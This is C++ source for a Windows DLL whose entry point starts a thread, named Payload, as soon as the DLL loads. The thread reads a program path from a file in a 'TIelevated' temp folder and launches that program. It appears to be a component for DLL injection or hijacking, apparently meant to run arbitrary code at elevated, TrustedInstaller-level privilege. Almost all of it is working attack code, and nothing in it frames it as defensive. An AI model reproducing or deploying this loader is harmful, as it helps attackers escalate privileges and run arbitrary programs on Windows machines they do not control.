#include "pch.h"
#include <windows.h>
#include <fstream>
#include <string>

static void Payload()
{
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string filePath = std::string(tempPath) + "TIelevated\\mylocation.txt";

    std::ifstream inputFile(filePath);
    if (!inputFile.is_open())
    {
        return;
    }

    std::string commandString;
    std::getline(inputFile, commandString);
    inputFile.close();

    if (commandString.empty())
    {
        return;
    }

    std::wstring wCommandString(commandString.begin(), commandString.end());
    STARTUPINFO si;
    si = {sizeof(STARTUPINFO)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    PROCESS_INFORMATION pi;

    if (CreateProcess(
        wCommandString.c_str(),    // Application path from the file
        nullptr,                   // Command line args
        nullptr,                   // Process handle not inheritable
        nullptr,                   // Thread handle not inheritable
        FALSE,                     // Inherit handles
        CREATE_NEW_CONSOLE,        // Ensures a new console window
        nullptr,                   // Use parent's environment
        nullptr,                   // Use parent's starting directory
        &si,                       // Pointer to STARTUPINFO
        &pi)                       // Pointer to PROCESS_INFORMATION
        )
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Payload), nullptr, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}